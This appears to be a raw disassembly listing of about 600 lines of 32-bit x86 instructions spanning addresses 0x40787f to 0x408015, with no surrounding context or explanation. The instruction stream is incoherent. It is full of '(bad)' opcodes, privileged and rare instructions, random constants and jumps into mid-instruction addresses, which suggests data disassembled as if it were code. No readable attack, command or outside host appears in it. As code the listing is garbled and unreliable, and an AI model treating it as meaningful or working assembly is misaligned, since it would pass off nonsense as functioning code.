  40787f:	sbb    eax,0x65816770
  407884:	inc    ebx
  407885:	add    al,0x1d
  407887:	bound  esi,QWORD PTR [edx-0x66]
  40788a:	sub    BYTE PTR [edi+ebx*2+0x39],bh
  40788e:	push   0x3c78e7d0
  407893:	jmp    FWORD PTR [esi+edx*1-0x5]
  407897:	xor    eax,0xf170421b
  40789c:	sbb    cl,BYTE PTR [edx+0x66]
  40789f:	pop    ss
  4078a0:	repz jne 0x4078fa
  4078a3:	sahf   
  4078a4:	daa    
  4078a5:	leave  
  4078a6:	mov    dh,0x13
  4078a8:	lods   al,BYTE PTR ds:[esi]
  4078a9:	adc    eax,0xa8353a65
  4078ae:	call   0x7e6b96ce
  4078b3:	jo     0x4078ab
  4078b5:	fistp  QWORD PTR [esi+0x54]
  4078b8:	pop    esi
  4078b9:	or     al,0x2d
  4078bb:	sub    al,0x94
  4078bd:	pop    es
  4078be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4078bf:	pop    eax
  4078c0:	xchg   edx,eax
  4078c1:	jb     0x40791a
  4078c3:	cmp    cl,ah
  4078c5:	jbe    0x407895
  4078c7:	mov    DWORD PTR [edx-0xa710890],ecx
  4078cd:	xchg   edi,eax
  4078ce:	dec    ebx
  4078cf:	fld    st(2)
  4078d1:	outs   dx,DWORD PTR ds:[esi]
  4078d2:	call   edi
  4078d4:	(bad)  
  4078d5:	jg     0x4078e9
  4078d7:	mov    esp,0xd9dfca08
  4078dc:	out    0xc1,eax
  4078de:	enter  0x99c1,0x6f
  4078e2:	inc    ebp
  4078e3:	cs aad 0x96
  4078e6:	scas   al,BYTE PTR es:[edi]
  4078e7:	xor    edi,0x39f41d11
  4078ed:	test   al,0x85
  4078ef:	inc    ebx
  4078f0:	xchg   DWORD PTR [edi],ecx
  4078f2:	fmul   DWORD PTR [ebx+0x2c]
  4078f5:	cmp    eax,0xa7b114b4
  4078fa:	xchg   esi,eax
  4078fb:	and    BYTE PTR [ebx-0x4b],cl
  4078fe:	cmp    ch,BYTE PTR [ebx]
  407900:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407901:	push   ebx
  407902:	mov    ch,0x90
  407904:	xchg   DWORD PTR [ebx],edi
  407906:	sub    ah,dh
  407908:	aam    0xc8
  40790a:	adc    eax,0x56d0c0a0
  40790f:	push   edi
  407910:	fdivr  QWORD PTR [edi]
  407912:	bound  esi,QWORD PTR [eax-0x2f]
  407915:	(bad)  
  407916:	push   ebx
  407917:	or     al,0xb0
  407919:	jle    0x407960
  40791b:	mov    cl,0x68
  40791d:	or     BYTE PTR ds:0x9a1b9c7e,al
  407923:	pop    ebx
  407924:	bnd jb 0x407968
  407927:	xlat   BYTE PTR ds:[ebx]
  407928:	mov    dl,0x7b
  40792a:	or     dh,dh
  40792c:	pop    ds
  40792d:	call   0x5cd9:0xe59343a5
  407934:	call   0x6662b7d2
  407939:	dec    esp
  40793a:	fistp  WORD PTR [edx+0x510c3ca4]
  407940:	int3   
  407941:	adc    BYTE PTR [eax+0x69454855],bh
  407947:	xchg   ebp,eax
  407948:	add    DWORD PTR [ecx-0x5a],0x450a2fcb
  40794f:	cmp    BYTE PTR [eax+0xd],bl
  407952:	xchg   edx,eax
  407953:	(bad)  
  407954:	cmp    eax,0x15b59f09
  407959:	sbb    al,0x4e
  40795b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40795d:	pop    edx
  40795e:	fisubr DWORD PTR [eax-0xeb67a1e]
  407964:	aam    0x1a
  407966:	lds    ebx,FWORD PTR [ebp-0x3efe73b3]
  40796c:	shl    DWORD PTR [ebx+eax*8-0x78],1
  407970:	and    al,0xfe
  407972:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407973:	out    dx,al
  407974:	dec    DWORD PTR [ebx]
  407976:	fnstcw WORD PTR [eax+eax*8-0x77]
  40797a:	addr16 jmp 0x5081415f
  407980:	(bad)  
  407981:	lods   al,BYTE PTR ds:[esi]
  407982:	in     eax,0x49
  407984:	jmp    0x40796b
  407986:	jmp    0x4079d0
  407988:	loop   0x4079c2
  40798a:	mov    ch,0xf3
  40798c:	dec    esi
  40798d:	lea    eax,[ecx-0x3301aae5]
  407993:	mov    ebx,0x5cb5aca
  407998:	adc    esp,DWORD PTR [eax]
  40799a:	jae    0x4079c3
  40799c:	rdmsr  
  40799e:	mov    ds:0xcb9b725e,eax
  4079a3:	pop    ss
  4079a4:	shl    BYTE PTR [eax+0x7211b7be],1
  4079aa:	mov    cl,BYTE PTR [esi-0x59]
  4079ad:	mov    ch,0x2c
  4079af:	push   ebp
  4079b0:	(bad)  
  4079b1:	hlt    
  4079b2:	(bad)  
  4079b3:	and    DWORD PTR [edi-0x30b44429],edx
  4079b9:	xor    al,0x23
  4079bb:	cdq    
  4079bc:	xchg   DWORD PTR [eax],ecx
  4079be:	push   ebx
  4079bf:	call   0xf7ac19c
  4079c4:	push   esp
  4079c5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4079c6:	xchg   esi,eax
  4079c7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4079c8:	push   ecx
  4079c9:	(bad)  [edx-0x4aec1667]
  4079cf:	inc    DWORD PTR [edx-0x4899f12d]
  4079d5:	xor    bl,BYTE PTR [esi+0x6b6efde8]
  4079db:	(bad)  
  4079dc:	cld    
  4079dd:	js     0x407999
  4079df:	jnp    0x407a33
  4079e1:	outs   dx,DWORD PTR ds:[esi]
  4079e2:	add    al,0x7e
  4079e4:	rol    ch,cl
  4079e6:	pop    esi
  4079e7:	xchg   edx,eax
  4079e8:	pop    edi
  4079e9:	or     eax,0xb84c564f
  4079ee:	mov    esi,esp
  4079f0:	rcr    esi,1
  4079f2:	and    DWORD PTR [ebx],ebx
  4079f4:	sub    DWORD PTR [edi+0x5167af12],0xffffff8b
  4079fb:	sbb    DWORD PTR [edx+edx*1],esp
  4079fe:	cmp    edi,DWORD PTR [eax]
  407a00:	pusha  
  407a01:	inc    edi
  407a02:	adc    al,0x10
  407a04:	es mov edx,0xf2d7adaa
  407a0a:	xor    eax,0x4c0818f0
  407a0f:	stos   DWORD PTR es:[edi],eax
  407a10:	or     ebp,DWORD PTR [ebx+0x15]
  407a13:	jmp    0x61b7:0x66070d1f
  407a1a:	aas    
  407a1b:	(bad)  
  407a1c:	cli    
  407a1d:	fisubr WORD PTR [edx]
  407a1f:	and    al,0xcf
  407a21:	inc    ebx
  407a22:	repz repz push 0x991ebbcf
  407a29:	pop    ebp
  407a2a:	sub    ecx,DWORD PTR [eax+0x5cb95497]
  407a30:	push   ebx
  407a31:	add    DWORD PTR [eax+0x663823b8],0x9d6e5fa7
  407a3b:	(bad)
  407a3e:	fstp   QWORD PTR [eax+0x19]
  407a41:	fnstsw ax
  407a43:	icebp  
  407a44:	aam    0x65
  407a46:	mov    ebx,0x995e2f3f
  407a4b:	push   eax
  407a4c:	inc    eax
  407a4d:	fldcw  WORD PTR [ecx-0x72]
  407a50:	jle    0x407a76
  407a52:	mov    bh,0xc5
  407a54:	xchg   edx,eax
  407a55:	gs push 0xcacd74fb
  407a5b:	dec    edi
  407a5c:	and    BYTE PTR [esi+ebx*8-0x6d],ah
  407a60:	jg     0x4079e8
  407a62:	clc    
  407a63:	arpl   WORD PTR ds:0x95145c91,bx
  407a69:	inc    eax
  407a6a:	jmp    0x77a00d39
  407a6f:	cwde   
  407a70:	nop
  407a71:	test   ebx,0xf54bd878
  407a77:	cmp    BYTE PTR [esi-0x49],0x1e
  407a7b:	adc    al,0x95
  407a7d:	push   ss
  407a7e:	stc    
  407a7f:	adc    DWORD PTR [esi+0x79],ebx
  407a82:	push   ss
  407a83:	loopne 0x407a7f
  407a85:	mov    ebp,0x7946fdf2
  407a8a:	and    dl,0xcb
  407a8d:	xchg   ebp,eax
  407a8e:	mov    BYTE PTR ds:0xb81b5851,0xd6
  407a95:	mov    edi,0x60a24168
  407a9a:	or     BYTE PTR [ecx-0x7d],ch
  407a9d:	push   cs
  407a9e:	and    DWORD PTR [ebp-0x2],ecx
  407aa1:	jp     0x407a71
  407aa3:	retf   
  407aa4:	xchg   edx,eax
  407aa5:	pop    edi
  407aa6:	and    eax,0xa75da77a
  407aab:	and    BYTE PTR [ebx-0x618a26a8],cl
  407ab1:	std    
  407ab2:	aaa    
  407ab3:	out    0xa8,eax
  407ab5:	fadd   QWORD PTR [ebp-0x571861ac]
  407abb:	push   esp
  407abc:	sbb    eax,0x2cbf432f
  407ac1:	xor    al,0x7a
  407ac3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407ac4:	mov    dh,0x97
  407ac6:	xor    BYTE PTR [eax+ecx*8-0x191baae5],bl
  407acd:	jg     0x407a6a
  407acf:	pop    ecx
  407ad0:	mov    WORD PTR [eax],ss
  407ad2:	pop    edx
  407ad3:	adc    BYTE PTR [ebp-0x3f],bh
  407ad6:	jb     0x407a72
  407ad8:	js     0x407ade
  407ada:	lods   al,BYTE PTR ds:[esi]
  407adb:	adc    eax,0x9dd2370f
  407ae0:	retf   
  407ae1:	pushf  
  407ae2:	jns    0x407b47
  407ae4:	lea    edi,[edx-0x75cce74c]
  407aea:	scas   al,BYTE PTR es:[edi]
  407aeb:	jg     0x407a7f
  407aed:	loopne 0x407b0f
  407aef:	test   ebx,edi
  407af1:	xchg   esi,eax
  407af2:	xchg   DWORD PTR [esp+edi*8+0x3481b557],ebx
  407af9:	and    DWORD PTR [edx],ecx
  407afb:	scas   al,BYTE PTR es:[edi]
  407afc:	fdivr  DWORD PTR [eax+0xc]
  407aff:	in     eax,0x49
  407b01:	test   DWORD PTR [edi+esi*2+0x4b],eax
  407b05:	xor    ebp,DWORD PTR [ebx]
  407b07:	lds    edx,FWORD PTR [edi]
  407b09:	mov    esp,0x60e0d507
  407b0e:	xchg   esi,eax
  407b0f:	cld    
  407b10:	popa   
  407b11:	iret   
  407b12:	jns    0x407a9e
  407b14:	dec    esi
  407b15:	push   edi
  407b16:	popf   
  407b17:	adc    bh,al
  407b19:	cli    
  407b1a:	rol    DWORD PTR [ecx+edx*4-0x5e],cl
  407b1e:	lea    ecx,[eax]
  407b20:	adc    dl,BYTE PTR [esi-0x10]
  407b23:	call   0xa142:0xf33de5c2
  407b2a:	push   cs
  407b2b:	(bad)  
  407b2c:	xor    ebp,DWORD PTR [ebx]
  407b2e:	mov    eax,0x6c495dcf
  407b33:	sub    eax,0xffffffd4
  407b36:	inc    esp
  407b37:	rol    DWORD PTR [ebp+ebp*4+0x52],1
  407b3b:	jmp    0x31fa:0x64cbb4f0
  407b42:	sbb    al,BYTE PTR [edx+ecx*1+0x74edf19e]
  407b49:	adc    DWORD PTR [edx],ebp
  407b4b:	push   edi
  407b4c:	int3   
  407b4d:	shl    BYTE PTR [ebx-0x76],cl
  407b50:	loop   0x407ba0
  407b52:	popf   
  407b53:	ret    
  407b54:	test   BYTE PTR [esp+ebx*8],ah
  407b57:	inc    edi
  407b58:	nop
  407b59:	and    esi,esp
  407b5b:	xchg   edx,eax
  407b5c:	sub    BYTE PTR [ebx],bl
  407b5e:	cmp    al,0x5f
  407b60:	(bad)  
  407b61:	jp     0x407bbb
  407b63:	inc    esi
  407b64:	sub    DWORD PTR [ebx+0x2d],edi
  407b67:	das    
  407b68:	(bad)  
  407b69:	mov    esi,DWORD PTR [ebp-0x12]
  407b6c:	add    al,dh
  407b6e:	adc    al,0x1a
  407b70:	out    dx,eax
  407b71:	dec    edx
  407b72:	mov    edi,0xad6f2ba3
  407b77:	mov    ch,0x2e
  407b79:	push   0xffffff9e
  407b7b:	test   DWORD PTR es:[edx+0x8a4ce25],edi
  407b82:	jo     0x407ba7
  407b84:	dec    ebp
  407b85:	enter  0x311a,0xd1
  407b89:	mov    cl,0x3a
  407b8b:	rol    esp,1
  407b8d:	mov    ds:0xea49e678,al
  407b92:	push   DWORD PTR [esp+ebp*8]
  407b95:	xor    edx,esi
  407b97:	mov    al,ds:0xd6839728
  407b9c:	(bad)  
  407b9d:	lods   al,BYTE PTR ds:[esi]
  407b9e:	call   0xc05ad277
  407ba3:	mov    ch,0xc4
  407ba5:	imul   BYTE PTR [ebp+eiz*4+0x688b9f98]
  407bac:	jl     0x407bc9
  407bae:	ror    DWORD PTR [esi+0x44],0xea
  407bb2:	fsubr  DWORD PTR [eax-0x72]
  407bb5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407bb6:	or     eax,DWORD PTR [ebp-0x209d9cba]
  407bbc:	push   edx
  407bbd:	sbb    eax,0xc603854e
  407bc2:	add    al,0xa0
  407bc4:	sbb    ecx,esi
  407bc6:	push   0x27f4019a
  407bcb:	je     0x407b61
  407bcd:	sub    dl,BYTE PTR [ecx+0x74]
  407bd0:	cmp    dl,BYTE PTR [ecx]
  407bd2:	mov    ebx,eax
  407bd4:	cli    
  407bd5:	inc    ecx
  407bd6:	outs   dx,BYTE PTR ds:[esi]
  407bd7:	call   DWORD PTR gs:[ecx-0x558f7e3a]
  407bde:	xchg   DWORD PTR [edi],ebp
  407be0:	jmp    0x407bf5
  407be2:	mov    ebp,DWORD PTR [edx+0x67]
  407be5:	pop    ecx
  407be6:	push   eax
  407be7:	mov    ebp,0x31483a94
  407bec:	jb     0x407b7b
  407bee:	in     eax,dx
  407bef:	or     DWORD PTR [esi+0x345c1825],0x7c
  407bf6:	sbb    al,0x59
  407bf8:	lods   al,BYTE PTR ds:[esi]
  407bf9:	scas   eax,DWORD PTR es:[edi]
  407bfa:	repnz cbw 
  407bfd:	and    al,0xaa
  407bff:	and    dl,dl
  407c01:	sub    al,0x5
  407c03:	mov    ds:0x5bbd059b,eax
  407c08:	add    DWORD PTR [esi],ebp
  407c0a:	cli    
  407c0b:	dec    esi
  407c0c:	jl     0x407c15
  407c0e:	jns    0x407b93
  407c10:	pop    ebp
  407c11:	adc    bl,ch
  407c13:	hlt    
  407c14:	inc    ebp
  407c15:	and    BYTE PTR [ebx-0x58],al
  407c18:	rsqrtps xmm7,XMMWORD PTR [ebp+0x34]
  407c1c:	push   ecx
  407c1d:	(bad)  
  407c1e:	hlt    
  407c1f:	xchg   ah,bl
  407c21:	cdq    
  407c22:	push   esp
  407c23:	xchg   ecx,eax
  407c24:	sbb    esp,DWORD PTR [ebx-0x45a6528e]
  407c2a:	mov    al,0x84
  407c2c:	cmp    eax,0xd42d8a56
  407c31:	mov    edi,0x5a10ca1b
  407c36:	cmp    al,0xc9
  407c38:	jmp    0x716101a8
  407c3d:	inc    ebx
  407c3e:	or     al,BYTE PTR [edx]
  407c40:	mov    edi,ebx
  407c42:	out    0x56,al
  407c44:	pusha  
  407c45:	or     eax,0x21a6d938
  407c4a:	xor    esp,ebp
  407c4c:	jecxz  0x407c08
  407c4e:	mov    ebx,cs
  407c50:	push   ebx
  407c51:	pop    es
  407c52:	mov    ds:0x520ad24b,eax
  407c57:	mov    esi,eax
  407c59:	jbe    0x407c20
  407c5b:	mov    esp,0x54381d84
  407c60:	jno    0x407c99
  407c62:	xlat   BYTE PTR ds:[ebx]
  407c63:	jne    0x407cad
  407c65:	lahf   
  407c66:	jne    0x407c88
  407c68:	inc    edi
  407c69:	xor    edi,edi
  407c6b:	mov    esp,0x6ea71c4
  407c70:	pop    edi
  407c71:	ret    
  407c72:	push   ebx
  407c73:	cmp    BYTE PTR [ebp+0x3f4ac7aa],cl
  407c79:	add    eax,0xd5761e7c
  407c7e:	pop    esi
  407c7f:	nop
  407c80:	sbb    edx,esp
  407c82:	ret    0x9a8f
  407c85:	mov    esp,0xce064e03
  407c8a:	daa    
  407c8b:	inc    esi
  407c8c:	dec    edx
  407c8d:	lods   eax,DWORD PTR ds:[esi]
  407c8e:	inc    ebx
  407c8f:	(bad)
  407c93:	(bad)  
  407c94:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407c95:	loope  0x407ce8
  407c97:	inc    esi
  407c98:	sar    BYTE PTR [eax+edi*2-0x5e],0xae
  407c9d:	ds ds sahf 
  407ca0:	call   0xa20b52df
  407ca5:	lahf   
  407ca6:	stos   DWORD PTR es:[edi],eax
  407ca7:	icebp  
  407ca8:	mov    cl,0xe1
  407caa:	not    BYTE PTR [edi+esi*4+0x7601cf99]
  407cb1:	cmc    
  407cb2:	(bad)  
  407cb3:	pop    eax
  407cb4:	adc    DWORD PTR [ebp-0x23],edi
  407cb7:	mov    cl,ah
  407cb9:	push   es
  407cba:	stos   DWORD PTR es:[edi],eax
  407cbb:	push   edi
  407cbc:	push   es
  407cbd:	jno    0x407ccf
  407cbf:	sbb    DWORD PTR [esi+ecx*2],edx
  407cc2:	jne    0x407c56
  407cc4:	loope  0x407ce9
  407cc6:	adc    eax,0x5ea883b
  407ccb:	inc    edx
  407ccc:	sbb    ebp,DWORD PTR [eax+0x2b]
  407ccf:	and    DWORD PTR [esp+edx*1-0x30],esi
  407cd3:	push   0xffffff97
  407cd5:	mov    eax,0xa35c57c1
  407cda:	leave  
  407cdb:	mov    ebp,0xab7a8b4e
  407ce0:	xor    ch,BYTE PTR [edx+esi*1]
  407ce3:	mov    ds:0x933fbb79,eax
  407ce8:	xor    ch,ch
  407cea:	addr16 retf 
  407cec:	pop    ds
  407ced:	sub    eax,0xd6522aeb
  407cf2:	jge    0x407cab
  407cf4:	dec    esi
  407cf5:	shl    BYTE PTR [eax],cl
  407cf7:	adc    dh,bl
  407cf9:	xchg   DWORD PTR es:[ebp+0x3200afca],esi
  407d00:	sbb    eax,0xd5aea990
  407d05:	test   DWORD PTR [ecx+ecx*2-0x7],eax
  407d09:	loopne 0x407c98
  407d0b:	pop    ss
  407d0c:	adc    edi,DWORD PTR [esi]
  407d0e:	test   esi,esi
  407d10:	inc    esp
  407d11:	pop    edi
  407d12:	pop    ecx
  407d13:	jmp    0x2c514d86
  407d18:	jp     0x407cde
  407d1a:	pop    ds
  407d1b:	ds (bad) 
  407d1d:	fisttp WORD PTR ds:0x10cf2374
  407d23:	mul    DWORD PTR [ebp-0x5f120b0]
  407d29:	and    DWORD PTR ds:0x89610f69,esi
  407d2f:	scas   al,BYTE PTR es:[edi]
  407d30:	xchg   ebp,eax
  407d31:	and    BYTE PTR [eax],al
  407d33:	pop    esp
  407d34:	mov    bl,0x18
  407d36:	dec    esi
  407d37:	dec    edx
  407d38:	xor    eax,0x5659238
  407d3d:	xor    BYTE PTR [esi-0x64],bh
  407d40:	clc    
  407d41:	enter  0xac00,0x73
  407d45:	loop   0x407cfc
  407d47:	clc    
  407d48:	dec    ecx
  407d49:	mov    dl,0xbb
  407d4b:	xor    ebp,ebx
  407d4d:	sbb    BYTE PTR [ebx],ch
  407d4f:	test   DWORD PTR [eax],ecx
  407d51:	mov    dh,0x3f
  407d53:	sub    esi,DWORD PTR [ebx-0x38]
  407d56:	shl    BYTE PTR [esi+0x13],cl
  407d59:	sub    ebx,DWORD PTR [eax+0x3d3eba16]
  407d5f:	xchg   ecx,eax
  407d60:	xchg   ebp,eax
  407d61:	imul   edx,DWORD PTR [edx],0x53ef90c
  407d67:	sub    eax,0x2d1906c7
  407d6c:	aaa    
  407d6d:	adc    ecx,edi
  407d6f:	rcl    DWORD PTR [ebx],cl
  407d71:	leave  
  407d72:	push   esi
  407d73:	or     DWORD PTR [ebx],ebx
  407d75:	cmp    esp,esi
  407d77:	xor    dh,BYTE PTR [esi]
  407d79:	xor    DWORD PTR [eax-0x38],eax
  407d7c:	xchg   esp,eax
  407d7d:	mov    dl,0x34
  407d7f:	sti    
  407d80:	nop
  407d81:	loope  0x407d97
  407d83:	jne    0x407d31
  407d85:	pop    ss
  407d86:	jnp    0x407db4
  407d88:	mov    edi,0x398958d2
  407d8d:	dec    esp
  407d8e:	push   0x9
  407d90:	popa   
  407d91:	js     0x407e00
  407d93:	adc    DWORD PTR ss:[ecx-0x55],0x3c
  407d98:	and    ebx,DWORD PTR [eax-0x60]
  407d9b:	daa    
  407d9c:	dec    ecx
  407d9d:	or     esp,DWORD PTR es:[si+0x1a]
  407da2:	jbe    0x407e05
  407da4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407da5:	mov    edi,0xb7bec572
  407daa:	or     BYTE PTR [esi+ebp*8-0x4fa94c12],ah
  407db1:	cmp    edi,DWORD PTR [edx+0x59]
  407db4:	jge    0x407d84
  407db6:	adc    DWORD PTR [edx],esi
  407db8:	stc    
  407db9:	or     DWORD PTR ds:0x65b138a4,eax
  407dbf:	push   ebx
  407dc0:	lea    ebp,ds:0x5f056282
  407dc6:	xchg   esi,eax
  407dc7:	fcomp  DWORD PTR [ecx+0x77]
  407dca:	icebp  
  407dcb:	fdivp  st(2),st
  407dcd:	in     eax,0xa3
  407dcf:	aam    0x12
  407dd1:	inc    esp
  407dd2:	and    esi,DWORD PTR [edx+0x51]
  407dd5:	ret    
  407dd6:	fisub  DWORD PTR [ebp+ebp*8+0x5e]
  407dda:	inc    esi
  407ddb:	imul   ebp,DWORD PTR [edi+esi*1+0x78],0x64
  407de0:	arpl   WORD PTR [edx+0xa4e8240],si
  407de6:	xchg   ebp,eax
  407de7:	dec    edx
  407de8:	in     eax,0x6a
  407dea:	jg     0x407e2c
  407dec:	test   DWORD PTR [ebx],esp
  407dee:	mov    al,0xe2
  407df0:	mov    al,0xe1
  407df2:	mov    dl,0xad
  407df4:	hlt    
  407df5:	mov    ebp,0x944c00da
  407dfa:	push   ebp
  407dfb:	dec    esp
  407dfc:	dec    ecx
  407dfd:	sub    DWORD PTR [ebx+0x4effdbec],ebp
  407e03:	dec    eax
  407e04:	inc    esi
  407e05:	int    0x40
  407e07:	dec    esp
  407e08:	test   BYTE PTR es:[edi-0x5774ea5c],bl
  407e0f:	jl     0x407d9b
  407e11:	push   edi
  407e12:	pushf  
  407e13:	or     dh,dl
  407e15:	into   
  407e16:	pop    ds
  407e17:	(bad)  
  407e18:	(bad)  
  407e1a:	cwde   
  407e1b:	jb     0x407db4
  407e1d:	pop    eax
  407e1e:	xor    eax,0x4265c8f5
  407e23:	lock lods eax,DWORD PTR ds:[esi]
  407e25:	ret    0x5d01
  407e28:	sub    DWORD PTR [ebx-0x56],ebp
  407e2b:	(bad)  
  407e2c:	xlat   BYTE PTR ds:[ebx]
  407e2d:	jmp    0x4d066f0d
  407e32:	lods   al,BYTE PTR ds:[esi]
  407e33:	ss (bad) 
  407e36:	sub    al,0x73
  407e38:	push   ebx
  407e39:	sub    edx,0x5b93cff7
  407e3f:	sar    BYTE PTR [edx+edi*2],0x9d
  407e43:	rcl    DWORD PTR [esp+edi*8+0x25],1
  407e47:	ret    
  407e48:	sub    DWORD PTR [esi-0x2f],edi
  407e4b:	and    al,0x72
  407e4d:	pop    eax
  407e4e:	inc    edx
  407e4f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407e50:	data16 dec BYTE PTR [eax+edi*4+0x4d]
  407e55:	imul   edi,ebx,0x2f
  407e58:	mov    edi,gs
  407e5a:	call   0x5ce9:0xae46c050
  407e61:	in     eax,0xa6
  407e63:	pushf  
  407e64:	daa    
  407e65:	or     al,0x4a
  407e67:	and    eax,0x75956ea2
  407e6c:	lods   eax,DWORD PTR ds:[esi]
  407e6d:	add    ebp,DWORD PTR [esi+0x12107aa3]
  407e73:	xor    eax,0x6833056
  407e78:	jle    0x407e20
  407e7a:	push   ss
  407e7b:	cmp    edx,ebx
  407e7d:	dec    edx
  407e7e:	sbb    eax,0x94843172
  407e83:	adc    eax,0xfe932c2e
  407e88:	xor    eax,0x8d98b3b1
  407e8d:	shl    DWORD PTR [esi],cl
  407e8f:	sbb    edx,edx
  407e91:	pop    ds
  407e92:	xchg   esi,eax
  407e93:	adc    edx,0xffffffb9
  407e96:	pop    esp
  407e97:	and    edx,edx
  407e99:	pop    esi
  407e9a:	loop   0x407e57
  407e9c:	clc    
  407e9d:	dec    ebp
  407e9e:	aam    0xfe
  407ea0:	inc    ecx
  407ea1:	int    0xc7
  407ea3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407ea4:	mov    al,0xc4
  407ea6:	dec    esi
  407ea7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407ea8:	dec    BYTE PTR [eax-0x29559e00]
  407eae:	stos   DWORD PTR es:[edi],eax
  407eaf:	out    0xed,al
  407eb1:	pop    ebp
  407eb2:	xchg   edi,eax
  407eb3:	ds cmc 
  407eb5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407eb6:	push   0xffffffb5
  407eb8:	repz ret 0x18ae
  407ebc:	leave  
  407ebd:	mov    bh,0x2b
  407ebf:	test   DWORD PTR [ecx+0x74],esi
  407ec2:	rol    DWORD PTR [eax],cl
  407ec4:	mov    esp,0x767145d
  407ec9:	dec    edi
  407eca:	or     BYTE PTR [ebx+0x571e865d],bh
  407ed0:	addr16 mov esi,0xa0573e92
  407ed6:	loop   0x407eed
  407ed8:	loope  0x407e60
  407eda:	jmp    0x1a07:0xc07df104
  407ee1:	add    BYTE PTR [ebp+0x10],cl
  407ee4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407ee5:	cmp    edi,ecx
  407ee7:	pop    ebp
  407ee8:	push   es
  407ee9:	xchg   ebp,eax
  407eea:	add    ebx,ebx
  407eec:	cdq    
  407eed:	jne    0x407ef9
  407eef:	mov    esp,0x848c49f1
  407ef4:	jb     0x407f40
  407ef6:	jle    0x407f31
  407ef8:	xlat   BYTE PTR ds:[ebx]
  407ef9:	aas    
  407efa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407efc:	clc    
  407efd:	fstp   QWORD PTR ds:0x30dc7517
  407f03:	sahf   
  407f04:	add    BYTE PTR [ecx+0x54],dl
  407f07:	sbb    bl,ch
  407f09:	sbb    al,BYTE PTR [edx-0x4321a4ef]
  407f0f:	jp     0x407f67
  407f11:	jge    0x407e96
  407f13:	mov    edx,0x78c64d15
  407f18:	mov    esi,0x5a436f3d
  407f1d:	std    
  407f1e:	not    BYTE PTR [eax+0x62]
  407f21:	push   ss
  407f22:	shr    BYTE PTR [edx-0x738fb5cf],1
  407f28:	ret    0x1163
  407f2b:	fwait
  407f2c:	int    0xb
  407f2e:	icebp  
  407f2f:	(bad)  
  407f30:	xor    BYTE PTR [edx-0x9],bl
  407f33:	push   es
  407f34:	mov    dl,0xd0
  407f36:	cmc    
  407f37:	mul    DWORD PTR [esi]
  407f39:	sbb    edi,DWORD PTR [edx]
  407f3b:	mov    ds:0xf1d030b3,al
  407f40:	ja     0x407f2e
  407f42:	sub    BYTE PTR [edx+edx*8],ah
  407f45:	jno    0x407fbb
  407f47:	cld    
  407f48:	push   ds
  407f49:	scas   eax,DWORD PTR es:[edi]
  407f4a:	stos   BYTE PTR es:[edi],al
  407f4b:	lods   al,BYTE PTR ds:[esi]
  407f4c:	sahf   
  407f4d:	jg     0x407f4e
  407f4f:	jo     0x407fa1
  407f51:	adc    al,0x5b
  407f53:	push   ebx
  407f54:	lahf   
  407f55:	(bad)  
  407f56:	and    DWORD PTR [edi+0x13],ecx
  407f59:	dec    eax
  407f5a:	xor    cl,dl
  407f5c:	std    
  407f5d:	(bad)  
  407f5e:	or     eax,0xb6bf5cb1
  407f63:	ret    
  407f64:	xchg   ebx,eax
  407f65:	mov    bh,0x68
  407f67:	xchg   ecx,eax
  407f68:	and    al,BYTE PTR [ebp+0x6a]
  407f6b:	mov    ebx,gs
  407f6d:	xor    ecx,DWORD PTR [ebp-0x4f411990]
  407f73:	retf   
  407f74:	scas   al,BYTE PTR es:[edi]
  407f75:	sbb    al,0xd2
  407f77:	fst    DWORD PTR [edx+ebx*1+0x77189bc8]
  407f7e:	jns    0x407f30
  407f80:	(bad)  
  407f81:	popf   
  407f82:	add    eax,0xf0e4702b
  407f87:	lea    ecx,[esi+0x45588edc]
  407f8d:	nop
  407f8e:	push   ebx
  407f8f:	mov    WORD PTR [edx+0x4e],?
  407f92:	lds    edi,FWORD PTR [ebp-0x639803a3]
  407f98:	or     eax,0x4ae729a8
  407f9d:	shl    DWORD PTR [edx],cl
  407f9f:	clc    
  407fa0:	sbb    edx,DWORD PTR [ebx]
  407fa2:	icebp  
  407fa3:	jno    0x407f93
  407fa5:	or     eax,0x19808e5e
  407faa:	(bad)  
  407fab:	ja     0x407f75
  407fad:	jmp    0x4646:0x4a2db0b4
  407fb4:	xor    ebx,ebx
  407fb6:	ret    0x19e6
  407fb9:	xchg   ebp,eax
  407fba:	inc    edi
  407fbb:	sbb    DWORD PTR [edx-0x18],edi
  407fbe:	test   al,0x1a
  407fc0:	and    eax,0xadc003d4
  407fc5:	int    0xd0
  407fc7:	add    al,0xaa
  407fc9:	dec    edx
  407fca:	push   es
  407fcb:	fadd   DWORD PTR [esi]
  407fcd:	daa    
  407fce:	jmp    0x8189:0xdb6d3e2a
  407fd5:	fnstsw WORD PTR [eax]
  407fd7:	fstp   QWORD PTR [eax-0x6b]
  407fda:	call   0x943c:0x1a720a3f
  407fe1:	jno    0x408041
  407fe3:	je     0x408001
  407fe5:	xchg   esi,eax
  407fe6:	es pop esi
  407fe8:	adc    bl,bl
  407fea:	and    eax,0xa3630867
  407fef:	lods   al,BYTE PTR es:[esi]
  407ff1:	sahf   
  407ff2:	fadd   DWORD PTR [ecx]
  407ff4:	mov    ecx,DWORD PTR [edx]
  407ff6:	inc    ebp
  407ff7:	mov    ds:0x473c039e,eax
  407ffc:	nop
  407ffd:	stos   BYTE PTR es:[edi],al
  407ffe:	xchg   ebx,eax
  407fff:	or     BYTE PTR [ebx-0x5d],ah
  408002:	lea    esp,[edi+0x25]
  408005:	jp     0x408059
  408007:	(bad)  
  408008:	jmp    0xa5057468
  40800d:	jmp    0xb02ec352
  408012:	mov    ds,WORD PTR [edi-0x1b]
  408015:	xchg   esi,eax
